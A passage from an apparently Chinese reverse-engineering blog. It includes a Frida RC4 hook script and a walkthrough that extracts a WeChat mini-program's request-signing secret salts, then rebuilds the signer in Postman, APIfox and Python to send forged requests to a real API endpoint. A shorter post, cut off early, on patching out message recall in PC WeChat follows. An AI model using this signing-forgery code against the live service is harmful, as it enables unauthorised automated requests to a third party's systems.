            console.log("key: ", hexdump(args[1]),"\n keyLen: ", args[2]);
        },onLeave:function(retval){
            console.log("RC4_init onLeave");
        }
    })
    Interceptor.attach(sub_88B8addr, {
        onEnter: function(args){
            this.arg1 = args[1];
            console.log("RC4_crypt onEnter");
            console.log("content: ", hexdump(args[1]), "\n contentLen: ", args[2]);
        },onLeave:function(retval){
            console.log("RC4_crypt onLeave");
            console.log("cryptResult: ", hexdump(this.arg1));
        }
    })
}

function main(){
    if(Java.available){
        Java.perform(function(){
            var RuntimeClass = Java.use("java.lang.Runtime");
            RuntimeClass.loadLibrary0.implementation = function(arg0,arg1){
                var result = this.loadLibrary0(arg0, arg1);
                console.log("loadLibrary0: ", arg1);
                if(arg1.indexOf("native-lib") != -1){
                    hooklibnativelib();
                }
                return result;
            }
        })
    }
}

setImmediate(main);
</code></pre>
<p>RC4加密算法在逆向分析过程中的快速识别方法：</p>
<ol>
<li>首先判断铭文和密文长度是否相等，登场则代表是序列密码。（可以通过编写frida脚本或xposed插件完成对响应函数的主动调用，判断当输入明文未任意长度时的密文长度）</li>
<li>接下来判断是否是RC4。RC4算法中的初始化算法（KSA）中有两轮非常显著的长度为256的循环体，用于根据给定的key生成S盒；伪随机子密码生成算法（PRGA）会根据上一步得到的扰乱的S盒，进一步生成子密钥流，最终和给定的明文进行逐字节的异或。</li>
</ol>
<h5 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h5><p>本章<a href="https://github.com/xiaoeeyu/frida-RC4/blob/main/frida-RC4.js">代码地址</a></p>
]]></content>
      <categories>
        <category>加密解密</category>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>RC4</tag>
        <tag>frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序-某某牛仔城</title>
    <url>/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/</url>
    <content><![CDATA[<p>本文中所有内容仅供研究与学习使用，禁止用于任何商业用途和非法用途，否则后果自负！！！</p>
<p>本章来分析一个微信小程序的协议，这个小程序的协议本身比较简单。主要是来学习一下分析微信小程序的流程</p>
<h1 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h1><p>设备：pixel 5 Android11.0</p>
<p>抓包：Charles + Postern</p>
<p>发包工具：postman、APIfox</p>
<h1 id="0x01-抓包"><a href="#0x01-抓包" class="headerlink" title="0x01 抓包"></a>0x01 抓包</h1><p>环境配置好了，那么先来抓个包吧</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916231010273.png" class="" title="image-20240916231010273">

<ul>
<li><p>随便选一个领取，这里我们以预览充值中心为例</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916222552201.png" class="" title="image-20240916222552201">

<ul>
<li><p>抓到的包比较多，找不到多翻翻</p>
</li>
<li><p>分析这个协议</p>
<blockquote>
<p>member_no：会员编号</p>
<p>type：操作目标的类型，例如这里33是“每日预览充值中心”</p>
<p>store_no：字面翻译是商店编号，这里我们抓了几次包都没变过。暂时当它是个固定值</p>
<p>sign：签名是本篇文章要分析的一个重点，看起来像是一个md5值</p>
<p>time：时间戳</p>
</blockquote>
<ul>
<li>经过分析，看起来只有这个<code>sign</code>需要我们进行分析，其它的都可以直接获取或者是固定值</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="0x02-分析小程序源码"><a href="#0x02-分析小程序源码" class="headerlink" title="0x02 分析小程序源码"></a>0x02 分析小程序源码</h1><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p>首先定位小程序的包</p>
<p>因为路径下小程序文件夹太多了，先清理一下。打开文件管理文件夹，进入<strong>Applet</strong>就能看到小程序的文件夹</p>
<ul>
<li>PS：有些小程序如果使用电脑打不开，可以去手机路径中pull下来。现在新版微信的小程序路径是<code>/data/data/com.tencent.mm/MicroMsg/appbrand/pkg</code></li>
</ul>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916223613382.png" class="" title="image-20240916223613382">

<p>然后重新打开一遍小程序，用everything搜索<code>.wxapkg</code>定位时间最近那个</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916223739140.png" class="" title="image-20240916223739140">

<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>小程序的解包工具有很多，在github上都可以找到。这里我们使用这个带界面的看起来比较清楚</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916223915227.png" class="" title="image-20240916223915227">

<p>解密成功后拖入<a href="https://github.com/ezshine/wxapkg-convertor">wxapkgconvertor.exe</a>，反编译</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224019832.png" class="" title="image-20240916224019832">

<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224026472.png" class="" title="image-20240916224026472">

<ul>
<li>反编译成功之后用IDE打开，这里我们使用<strong>微信开发者工具</strong>打开</li>
<li>PS：里面有一个<code>app-service.js</code>文件特别大，建议复制下来在网上找工具格式化一下。本机直接格式化容易卡死</li>
</ul>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>根据前面对抓包协议的分析，我们只需要分析<code>sign</code>怎么获取的就好了。那就直接搜索<code>sign</code></p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224313617.png" class="" title="image-20240916224313617">

<ul>
<li>运气比较好，搜索的第三个结果直接定位到了获取签名的函数</li>
<li>其中<code>var u = a.default.hexMD5(n + t + w + m + v + p);</code>把一系列值组合然后进行了DM5计算，这就是我们要找的<code>sign</code></li>
</ul>
<h3 id="计算sign"><a href="#计算sign" class="headerlink" title="计算sign"></a>计算sign</h3><p>把代码抠出来，自己重新计算一下获取sign<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224654806.png" class="" title="image-20240916224654806"></p>
<ul>
<li>这里用到了一个<code>hexMD5</code>的外部方法，搜索一下把这个方法也抠出来</li>
</ul>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224759444.png" class="" title="image-20240916224759444">

<ul>
<li>这里又用到了一个<code>o</code>方法，也找到抠出来</li>
</ul>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916224903780.png" class="" title="image-20240916224903780">

<ul>
<li>这里一堆互相调用的都抠出来</li>
</ul>
<pre><code class="js">function getxSign() {
    var d = "511MrfpKD^",
    h = "GKXW58GHG",
    p = "#iki0Dhr",
    g = "ASF74XSR^",
    v = "@UnOaJYS",
    m = "KIoa7YXIaN",
    y = "648DCGFG^",
    w = "511MrfpK^";
    var e = arguments.length &gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : {},
        t = arguments.length &gt; 1 ? arguments[1] : void 0,
        r = e.query || {},
        n = "";
    console.log("getSign.times===&gt;"), console.log(t), console.log("getSign.data===&gt;"), console.log(r);
    for (var o = Object.keys(r).sort(), i = {}, s = 0; s &lt; o.length; s++) i[o[s]] = r[o[s]];
    for (var l in console.log("data排序后===&gt;"), console.log(i), i) n += l + i[l];
    var u = a.default.hexMD5(n + t + w + m + v + p);
    return console.log("getSign.sign===&gt;"), console.log(u), u
}

function hexMD5(e) {
    return function(e) {
        for (var t = "0123456789abcdef", r = "", n = 0; n &lt; 4 * e.length; n++) r += t.charAt(e[n &gt;&gt; 2] &gt;&gt; n % 4 * 8 + 4 &amp; 15) + t.charAt(e[n &gt;&gt; 2] &gt;&gt; n % 4 * 8 &amp; 15);
        return r
    }(function(e) {
        for (var t = 1732584193, n = -271733879, l = -1732584194, u = 271733878, c = 0; c &lt; e.length; c += 16) {
            var f = t,
                d = n,
                h = l,
                p = u;
            t = o(t, n, l, u, e[c + 0], 7, -680876936), u = o(u, t, n, l, e[c + 1], 12, -389564586), l = o(l, u, t, n, e[c + 2], 17, 606105819), n = o(n, l, u, t, e[c + 3], 22, -1044525330), t = o(t, n, l, u, e[c + 4], 7, -176418897), u = o(u, t, n, l, e[c + 5], 12, 1200080426), l = o(l, u, t, n, e[c + 6], 17, -1473231341), n = o(n, l, u, t, e[c + 7], 22, -45705983), t = o(t, n, l, u, e[c + 8], 7, 1770035416), u = o(u, t, n, l, e[c + 9], 12, -1958414417), l = o(l, u, t, n, e[c + 10], 17, -42063), n = o(n, l, u, t, e[c + 11], 22, -1990404162), t = o(t, n, l, u, e[c + 12], 7, 1804603682), u = o(u, t, n, l, e[c + 13], 12, -40341101), l = o(l, u, t, n, e[c + 14], 17, -1502002290), t = i(t, n = o(n, l, u, t, e[c + 15], 22, 1236535329), l, u, e[c + 1], 5, -165796510), u = i(u, t, n, l, e[c + 6], 9, -1069501632), l = i(l, u, t, n, e[c + 11], 14, 643717713), n = i(n, l, u, t, e[c + 0], 20, -373897302), t = i(t, n, l, u, e[c + 5], 5, -701558691), u = i(u, t, n, l, e[c + 10], 9, 38016083), l = i(l, u, t, n, e[c + 15], 14, -660478335), n = i(n, l, u, t, e[c + 4], 20, -405537848), t = i(t, n, l, u, e[c + 9], 5, 568446438), u = i(u, t, n, l, e[c + 14], 9, -1019803690), l = i(l, u, t, n, e[c + 3], 14, -187363961), n = i(n, l, u, t, e[c + 8], 20, 1163531501), t = i(t, n, l, u, e[c + 13], 5, -1444681467), u = i(u, t, n, l, e[c + 2], 9, -51403784), l = i(l, u, t, n, e[c + 7], 14, 1735328473), t = a(t, n = i(n, l, u, t, e[c + 12], 20, -1926607734), l, u, e[c + 5], 4, -378558), u = a(u, t, n, l, e[c + 8], 11, -2022574463), l = a(l, u, t, n, e[c + 11], 16, 1839030562), n = a(n, l, u, t, e[c + 14], 23, -35309556), t = a(t, n, l, u, e[c + 1], 4, -1530992060), u = a(u, t, n, l, e[c + 4], 11, 1272893353), l = a(l, u, t, n, e[c + 7], 16, -155497632), n = a(n, l, u, t, e[c + 10], 23, -1094730640), t = a(t, n, l, u, e[c + 13], 4, 681279174), u = a(u, t, n, l, e[c + 0], 11, -358537222), l = a(l, u, t, n, e[c + 3], 16, -722521979), n = a(n, l, u, t, e[c + 6], 23, 76029189), t = a(t, n, l, u, e[c + 9], 4, -640364487), u = a(u, t, n, l, e[c + 12], 11, -421815835), l = a(l, u, t, n, e[c + 15], 16, 530742520), t = s(t, n = a(n, l, u, t, e[c + 2], 23, -995338651), l, u, e[c + 0], 6, -198630844), u = s(u, t, n, l, e[c + 7], 10, 1126891415), l = s(l, u, t, n, e[c + 14], 15, -1416354905), n = s(n, l, u, t, e[c + 5], 21, -57434055), t = s(t, n, l, u, e[c + 12], 6, 1700485571), u = s(u, t, n, l, e[c + 3], 10, -1894986606), l = s(l, u, t, n, e[c + 10], 15, -1051523), n = s(n, l, u, t, e[c + 1], 21, -2054922799), t = s(t, n, l, u, e[c + 8], 6, 1873313359), u = s(u, t, n, l, e[c + 15], 10, -30611744), l = s(l, u, t, n, e[c + 6], 15, -1560198380), n = s(n, l, u, t, e[c + 13], 21, 1309151649), t = s(t, n, l, u, e[c + 4], 6, -145523070), u = s(u, t, n, l, e[c + 11], 10, -1120210379), l = s(l, u, t, n, e[c + 2], 15, 718787259), n = s(n, l, u, t, e[c + 9], 21, -343485551), t = r(t, f), n = r(n, d), l = r(l, h), u = r(u, p)
        }
        return [t, n, l, u]
    }(function(e) {
        for (var t = 1 + (e.length + 8 &gt;&gt; 6), r = new Array(16 * t), n = 0; n &lt; 16 * t; n++) r[n] = 0;
        for (n = 0; n &lt; e.length; n++) r[n &gt;&gt; 2] |= (255 &amp; e.charCodeAt(n)) &lt;&lt; n % 4 * 8;
        return r[n &gt;&gt; 2] |= 128 &lt;&lt; n % 4 * 8, r[16 * t - 2] = 8 * e.length, r
    }(e)))

    function r(e, t) {
        var r = (65535 &amp; e) + (65535 &amp; t);
        return (e &gt;&gt; 16) + (t &gt;&gt; 16) + (r &gt;&gt; 16) &lt;&lt; 16 | 65535 &amp; r
    }

    function n(e, t, n, o, i, a) {
        return r(function (e, t) {
            return e &lt;&lt; t | e &gt;&gt;&gt; 32 - t
        }(r(r(t, e), r(o, a)), i), n)
    }

    function o(e, t, r, o, i, a, s) {
        return n(t &amp; r | ~t &amp; o, e, t, i, a, s)
    }

    function i(e, t, r, o, i, a, s) {
        return n(t &amp; o | r &amp; ~o, e, t, i, a, s)
    }

    function a(e, t, r, o, i, a, s) {
        return n(t ^ r ^ o, e, t, i, a, s)
    }

    function s(e, t, r, o, i, a, s) {
        return n(r ^ (t | ~o), e, t, i, a, s)
    }
}
</code></pre>
<ul>
<li>最终我们抠出来的代码，反编译的代码比较混乱不好看懂。我们找人工智能工具重写一下<code>getxSign</code>函数，计算MD5那个函数就算了没必要重写。</li>
</ul>
<pre><code class="js">function getxSign(data = {}, timestamp) {
    // 定义常量
    const d = "511MrfpKD^",
          h = "GKXW58GHG",
          p = "#iki0Dhr",
          g = "ASF74XSR^",
          v = "@UnOaJYS",
          m = "KIoa7YXIaN",
          y = "648DCGFG^",
          w = "511MrfpK^";
    
    // 提取查询参数并初始化拼接字符串
    const query = data.query || {};
    let concatenatedString = "";

    // 打印输入的时间戳和数据
    console.log("getSign.times===&gt;", timestamp);
    console.log("getSign.data===&gt;", query);

    // 将对象键按字母顺序排序
    const sortedKeys = Object.keys(query).sort();
    const sortedData = {};

    // 根据排序后的键重新构建对象
    sortedKeys.forEach(key =&gt; {
        sortedData[key] = query[key];
    });

    // 打印排序后的数据
    console.log("data排序后===&gt;", sortedData);

    // 构建签名字符串
    for (const key in sortedData) {
        concatenatedString += key + sortedData[key];
    }

    // 使用 MD5 计算签名
    const signature = hexMD5(concatenatedString + timestamp + w + m + v + p);
    
    // 打印签名结果并返回
    console.log("getSign.sign===&gt;", signature);
    return signature;
}
</code></pre>
<ul>
<li>现在看起来就比较清楚了</li>
</ul>
<p>接下来我们尝试调用一下，跟抓包的协议比较一下计算的签名是否相同</p>
<ul>
<li><p>这里不知道应该怎么传递参数，问一下chatGPT</p>
<blockquote>
<p><code>getxSign()</code> 函数需要两个参数：</p>
<ol>
<li><p><strong>第一个参数</strong> <code>e</code> 是一个对象，通常包含 <code>query</code> 属性，<code>query</code> 是一个键值对对象。这个对象中的键值对会被用于生成签名（<code>sign</code>）。</p>
<ul>
<li>**<code>e.query</code>**：包含要签名的数据，它的键会被按字母排序，然后与它的值拼接在一起。</li>
</ul>
<p>例如：</p>
<pre><code class="javascript">const e = {
    query: {
        foo: "value1",
        bar: "value2"
    }
};
</code></pre>
</li>
<li><p><strong>第二个参数</strong> <code>t</code> 是一个时间戳或某种密钥值，它将在签名的生成中用到。这个值会拼接在 <code>query</code> 的数据之后，用于生成最终的 MD5 哈希。</p>
<p>例如：</p>
<pre><code class="javascript">const t = "20240916"; // 假设这个是某个时间戳或密钥
</code></pre>
</li>
</ol>
<h3 id="调用示例"><a href="#调用示例" class="headerlink" title="调用示例"></a>调用示例</h3><pre><code class="javascript">const e = {
    query: {
        foo: "value1",
        bar: "value2"
    }
};

const t = "20240916"; // 假设这是时间戳或密钥

const sign = getxSign(e, t);
console.log("Generated Sign:", sign);
</code></pre>
<p>在这个例子中，<code>getxSign</code> 会对 <code>query</code> 对象中的键（<code>bar</code>, <code>foo</code>）按字母顺序排序，并与对应的值拼接成字符串，再加上时间戳 <code>t</code> 和其他固定值，生成最终的 MD5 哈希签名。</p>
</blockquote>
</li>
</ul>
<p>添加调用代码</p>
<pre><code class="js">const e = {
    query: {
        member_no: 973470,
        type: 33,
        store_no: 12
    }
};
// console.log(getxSign(e, t))
var sign = getxSign(e, "20240916222353")	// 时间戳传递协议中的时间戳
</code></pre>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916230028577.png" class="" title="image-20240916230028577">

<ul>
<li>跟抓包的<code>sign</code>对比一下，确定两个sign相同</li>
<li>这里计算的结果相同，说明我们正确的获取到了<code>sign</code></li>
</ul>
<h2 id="发包确认"><a href="#发包确认" class="headerlink" title="发包确认"></a>发包确认</h2><p>接下来构建一下完整的协议，看看是否能获取服务器的返回结果</p>
<p>发包工具这里尝试了两种常用的工具，postman、APIfox。postman更轻量一些，APIfox的功能更强大更全面一些。用哪个都可以</p>
<p>另外还尝试了使用Python直接发包</p>
<h4 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h4><p>请求成功</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916231157553.png" class="" title="image-20240916231157553">

<ul>
<li><p>这里主要有几个地方需要我们设置</p>
<blockquote>
<ol>
<li><p>改为<code>POST</code></p>
</li>
<li><p>在Charles中把URL拷贝过来</p>
</li>
<li><p>因为我们在代码中把最终的<code>body</code>保存为了Postman中的<code>query</code>变量，所以要在<strong>Body</strong>选项中设置一下</p>
<p><img src="F:/Typora/wx小程序-疯狂牛仔城/image-20240916215209121.png" alt="image-20240916215209121"></p>
</li>
<li><p>填入我们的代码</p>
<pre><code class="js">function hexMD5(e) {
    return function (e) {
        for (var t = "0123456789abcdef", r = "", n = 0; n &lt; 4 * e.length; n++) r += t.charAt(e[n &gt;&gt; 2] &gt;&gt; n % 4 * 8 + 4 &amp; 15) + t.charAt(e[n &gt;&gt; 2] &gt;&gt; n % 4 * 8 &amp; 15);
        return r
    }(function (e) {
        for (var t = 1732584193, n = -271733879, l = -1732584194, u = 271733878, c = 0; c &lt; e.length; c += 16) {
            var f = t,
                d = n,
                h = l,
                p = u;
            t = o(t, n, l, u, e[c + 0], 7, -680876936), u = o(u, t, n, l, e[c + 1], 12, -389564586), l = o(l, u, t, n, e[c + 2], 17, 606105819), n = o(n, l, u, t, e[c + 3], 22, -1044525330), t = o(t, n, l, u, e[c + 4], 7, -176418897), u = o(u, t, n, l, e[c + 5], 12, 1200080426), l = o(l, u, t, n, e[c + 6], 17, -1473231341), n = o(n, l, u, t, e[c + 7], 22, -45705983), t = o(t, n, l, u, e[c + 8], 7, 1770035416), u = o(u, t, n, l, e[c + 9], 12, -1958414417), l = o(l, u, t, n, e[c + 10], 17, -42063), n = o(n, l, u, t, e[c + 11], 22, -1990404162), t = o(t, n, l, u, e[c + 12], 7, 1804603682), u = o(u, t, n, l, e[c + 13], 12, -40341101), l = o(l, u, t, n, e[c + 14], 17, -1502002290), t = i(t, n = o(n, l, u, t, e[c + 15], 22, 1236535329), l, u, e[c + 1], 5, -165796510), u = i(u, t, n, l, e[c + 6], 9, -1069501632), l = i(l, u, t, n, e[c + 11], 14, 643717713), n = i(n, l, u, t, e[c + 0], 20, -373897302), t = i(t, n, l, u, e[c + 5], 5, -701558691), u = i(u, t, n, l, e[c + 10], 9, 38016083), l = i(l, u, t, n, e[c + 15], 14, -660478335), n = i(n, l, u, t, e[c + 4], 20, -405537848), t = i(t, n, l, u, e[c + 9], 5, 568446438), u = i(u, t, n, l, e[c + 14], 9, -1019803690), l = i(l, u, t, n, e[c + 3], 14, -187363961), n = i(n, l, u, t, e[c + 8], 20, 1163531501), t = i(t, n, l, u, e[c + 13], 5, -1444681467), u = i(u, t, n, l, e[c + 2], 9, -51403784), l = i(l, u, t, n, e[c + 7], 14, 1735328473), t = a(t, n = i(n, l, u, t, e[c + 12], 20, -1926607734), l, u, e[c + 5], 4, -378558), u = a(u, t, n, l, e[c + 8], 11, -2022574463), l = a(l, u, t, n, e[c + 11], 16, 1839030562), n = a(n, l, u, t, e[c + 14], 23, -35309556), t = a(t, n, l, u, e[c + 1], 4, -1530992060), u = a(u, t, n, l, e[c + 4], 11, 1272893353), l = a(l, u, t, n, e[c + 7], 16, -155497632), n = a(n, l, u, t, e[c + 10], 23, -1094730640), t = a(t, n, l, u, e[c + 13], 4, 681279174), u = a(u, t, n, l, e[c + 0], 11, -358537222), l = a(l, u, t, n, e[c + 3], 16, -722521979), n = a(n, l, u, t, e[c + 6], 23, 76029189), t = a(t, n, l, u, e[c + 9], 4, -640364487), u = a(u, t, n, l, e[c + 12], 11, -421815835), l = a(l, u, t, n, e[c + 15], 16, 530742520), t = s(t, n = a(n, l, u, t, e[c + 2], 23, -995338651), l, u, e[c + 0], 6, -198630844), u = s(u, t, n, l, e[c + 7], 10, 1126891415), l = s(l, u, t, n, e[c + 14], 15, -1416354905), n = s(n, l, u, t, e[c + 5], 21, -57434055), t = s(t, n, l, u, e[c + 12], 6, 1700485571), u = s(u, t, n, l, e[c + 3], 10, -1894986606), l = s(l, u, t, n, e[c + 10], 15, -1051523), n = s(n, l, u, t, e[c + 1], 21, -2054922799), t = s(t, n, l, u, e[c + 8], 6, 1873313359), u = s(u, t, n, l, e[c + 15], 10, -30611744), l = s(l, u, t, n, e[c + 6], 15, -1560198380), n = s(n, l, u, t, e[c + 13], 21, 1309151649), t = s(t, n, l, u, e[c + 4], 6, -145523070), u = s(u, t, n, l, e[c + 11], 10, -1120210379), l = s(l, u, t, n, e[c + 2], 15, 718787259), n = s(n, l, u, t, e[c + 9], 21, -343485551), t = r(t, f), n = r(n, d), l = r(l, h), u = r(u, p)
        }
        return [t, n, l, u]
    }(function (e) {
        for (var t = 1 + (e.length + 8 &gt;&gt; 6), r = new Array(16 * t), n = 0; n &lt; 16 * t; n++) r[n] = 0;
        for (n = 0; n &lt; e.length; n++) r[n &gt;&gt; 2] |= (255 &amp; e.charCodeAt(n)) &lt;&lt; n % 4 * 8;
        return r[n &gt;&gt; 2] |= 128 &lt;&lt; n % 4 * 8, r[16 * t - 2] = 8 * e.length, r
    }(e)))
   
    function r(e, t) {
        var r = (65535 &amp; e) + (65535 &amp; t);
        return (e &gt;&gt; 16) + (t &gt;&gt; 16) + (r &gt;&gt; 16) &lt;&lt; 16 | 65535 &amp; r
    }
   
    function n(e, t, n, o, i, a) {
        return r(function (e, t) {
            return e &lt;&lt; t | e &gt;&gt;&gt; 32 - t
        }(r(r(t, e), r(o, a)), i), n)
    }
   
    function o(e, t, r, o, i, a, s) {
        return n(t &amp; r | ~t &amp; o, e, t, i, a, s)
    }
   
    function i(e, t, r, o, i, a, s) {
        return n(t &amp; o | r &amp; ~o, e, t, i, a, s)
    }
   
    function a(e, t, r, o, i, a, s) {
        return n(t ^ r ^ o, e, t, i, a, s)
    }
   
    function s(e, t, r, o, i, a, s) {
        return n(r ^ (t | ~o), e, t, i, a, s)
    }
}
   
// 获取时间戳
function getCurrentTimestamp() {
    var date = new Date();
    var year = date.getFullYear();
    var month = ('0' + (date.getMonth() + 1)).slice(-2);
    var day = ('0' + date.getDate()).slice(-2);
    var hours = ('0' + date.getHours()).slice(-2);
    var minutes = ('0' + date.getMinutes()).slice(-2);
    var seconds = ('0' + date.getSeconds()).slice(-2);
    return year + month + day + hours + minutes + seconds;
}
   
function getxSign(e = {}, t) {
    const w = "511MrfpK^",
          m = "KIoa7YXIaN",
          v = "@UnOaJYS",
          p = "#iki0Dhr";
   
    const r = e.query || {};
    let n = "";
   
    console.log("getSign.times ===&gt;", t, "getSign.data ===&gt;", r);
   
    // 对 query 对象的键按字母排序后拼接
    const sortedKeys = Object.keys(r).sort();
    sortedKeys.forEach(key =&gt; {
        n += key + r[key];
    });
   
    console.log("data 排序后 ===&gt;", n);
   
    // 计算 MD5 签名
    const sign = hexMD5(n + t + w + m + v + p);
    console.log("getSign.sign ===&gt;", sign);
   
    return sign;
}
   
var t = getCurrentTimestamp();
var body = {
    "member_no": 973470,
    "type": 33,
    "store_no": 12
};
   
var sign = getxSign({
    query: {
        "member_no": 973470,
        "type": 33,
        "store_no": 12
    }
}, t)
   
body.sign = sign;
body.time = t;
   
console.log("final body ==&gt; ",body)
   
// 将 body 设置为 Postman 变量
pm.variables.set("query", JSON.stringify(body));
</code></pre>
<ul>
<li>这是最终的完整代码</li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ul>
<h4 id="APIfox"><a href="#APIfox" class="headerlink" title="APIfox"></a>APIfox</h4><p>跟postman用起来差不多一样， 只是有些设置的位置改变了点</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916231346415.png" class="" title="image-20240916231346415">

<p>代码还是一模一样的，填入前置操作中就可以</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916231520566.png" class="" title="image-20240916231520566">



<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>使用Python脚本直接发包</p>
<pre><code class="python">import hashlib
import requests
import json
from datetime import datetime

# 常量定义
CONSTANTS = {
    'd': "511MrfpKD^",
    'h': "GKXW58GHG",
    'p': "#iki0Dhr",
    'g': "ASF74XSR^",
    'v': "@UnOaJYS",
    'm': "KIoa7YXIaN",
    'y': "648DCGFG^",
    'w': "511MrfpK^"
}

# 获取当前时间戳
def get_current_timestamp():
    now = datetime.now()
    return now.strftime('%Y%m%d%H%M%S')

# 计算签名的函数，使用 MD5
def getxSign(params, timestamp):
    query = params.get("query", {})
    sorted_keys = sorted(query.keys())
    
    concatenated_string = "".join([key + str(query[key]) for key in sorted_keys])
    concatenated_string += timestamp + CONSTANTS['w'] + CONSTANTS['m'] + CONSTANTS['v'] + CONSTANTS['p']
    
    # 生成 MD5 签名
    sign = hashlib.md5(concatenated_string.encode('utf-8')).hexdigest()
    return sign

# 发送请求的函数
def send_request():
    # 请求体中的参数
    body = {
        "member_no": 973470,
        "type": 33,
        "store_no": 12
    }

    # 获取当前时间戳
    time = get_current_timestamp()

    # 生成签名
    sign = getxSign({
        "query": body
    }, time)

    # 将签名和时间戳加入到请求体
    body['sign'] = sign
    body['time'] = time

    # 打印请求体，查看是否正确
    print("Final body: ", body)

    # 发送 POST 请求
    url = "https://mpg.avillage.com.cn/api/grow/doGrow"  # 替换为实际的API URL
    headers = {
        "Content-Type": "application/json"
    }

    # 发起 HTTP 请求
    response = requests.post(url, headers=headers, data=json.dumps(body))

    # 输出响应
    print("Response Status Code: ", response.status_code)
    print("Response JSON: ", response.json())

# 执行请求
send_request()
</code></pre>
<p>执行结果：</p>
<img src="/2024/09/16/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E6%9F%90%E6%9F%90%E7%89%9B%E4%BB%94%E5%9F%8E/image-20240916231821536.png" class="" title="image-20240916231821536">

]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>微信小程序逆向</tag>
        <tag>协议分析</tag>
      </tags>
  </entry>
  <entry>
    <title>微信防撤回</title>
    <url>/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/</url>
    <content><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>阻止PC版微信消息撤回</p>
<span id="more"></span>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ol>
<li><p>再微信程序文件夹搜索关键字：撤回是revoke撤回消息我们搜索<code>revokemsg</code>关键字</p>
<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607171641322.png" class="" title="image-20210607171641322">

<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607171912664.png" class="" title="image-20210607171912664">

<ul>
<li>通过搜索关键字确定消息撤回的功能大概率在这个dll文件里</li>
</ul>
</li>
<li><p>开始用x32Dbg加载微信分析这个dll</p>
<p>2.1. 找到这个dll之后，在这个dll里面搜索字符串<code>revokemsg</code></p>
<img src="/2021/06/07/%E5%BE%AE%E4%BF%A1%E9%98%B2%E6%92%A4%E5%9B%9E/image-20210607172239988.png" class="" title="image-20210607172239988">

<p>2.2. 找到第一个revokemsg字符串</p>
